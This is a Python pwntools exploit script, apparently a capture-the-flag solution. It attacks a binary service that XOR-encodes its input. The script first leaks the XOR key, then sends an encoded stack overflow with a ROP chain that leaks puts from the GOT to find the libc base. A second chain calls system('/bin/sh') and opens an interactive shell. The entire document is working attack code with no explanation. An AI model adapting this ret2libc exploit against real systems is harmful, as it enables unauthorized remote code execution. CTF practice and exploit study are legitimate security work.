from pwn import *

if len(sys.argv)==1:
    p=process("linuxserver64")
elif sys.argv[1]=="1":
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
    pause()
elif sys.argv[1]=="3":
    #context.log_level='debug'
    p=remote("functf",18021)
elif sys.argv[1]=="5":
    #context.log_level='debug'
    p=remote("functf",4444)
elif sys.argv[1]=="4":
    context.log_level='debug'
    p=remote("localhost",18021)

def get_mykeys():
    buf=p.recvuntil("--]\n")
    print buf
    
    payload=""
    payload+="E"
    payload+=p64(0x80)
    payload+="\x00"*0x80
    p.send(payload)
    
    buf=p.recvuntil("--]\n")
    print buf
    
    strlen=p.recv(8)
    mykeys=p.recv(0x80)
    print hexdump(mykeys)
    return mykeys
    
mykeys=get_mykeys()

def myxor(buf):
    i2=0
    result=""
    while i2<len(buf):
        i1=i2%0x80
        c1=mykeys[i1:i1+1]
        c2=buf[i2:i2+1]
        result+=chr(ord(c1)^ord(c2))
        i2+=1
    return result

poprdi = 0x0000000000400aa3
puts_got = 0x601018
puts_plt = 0x400630
enc_file = 0x400901
ret      = 0x400A08

myplain=""
myplain+="A"*0x2000
myplain+="B"*0x10
myplain+=p64(ret)*10
myplain+=p64(poprdi)
myplain+=p64(puts_got)
myplain+=p64(puts_plt)
myplain+=p64(enc_file)

mysize=len(myplain)

print hex(mysize)

payload=""
payload+="E"
payload+=p64(mysize)
payload+=myxor(myplain)
p.send(payload)

#buf=p.recvuntil("--]\n")
#print buf
pause()

buf=p.recvuntil("--]\n")
print buf

pause()
mysize_str = p.recv(8)

pause()
mytext=""
while(len(mytext) < mysize):
    mytext += p.recv(mysize-len(mytext))
#mytext=p.recvrepeat(5)
print hex(len(mytext))
pause()

p.send("Q")

libc_puts=u64(p.recv(6).ljust(8,'\x00'))
libc_elf=ELF("../r64.libc.so.6")
libc_base=libc_puts - libc_elf.sym["puts"]
print 'libc_base:',hex(libc_base)

pause()

myplain=""
myplain+="A"*0x2000
myplain+="B"*0x10
myplain+=p64(ret)*10
myplain+=p64(poprdi)
myplain+=p64(libc_base + libc_elf.search("/bin/sh").next())
myplain+=p64(libc_base + libc_elf.sym["system"])
myplain+=p64(0xdeadbeef)

mysize=len(myplain)

print hex(mysize)

payload=""
payload+="E"
payload+=p64(mysize)
payload+=myxor(myplain)
p.send(payload)

buf=p.recvuntil("--]\n")
print buf

mytext = ""
while(len(mytext) < mysize):
    mytext += p.recv(mysize-len(mytext))

p.send("Q")

p.interactive()
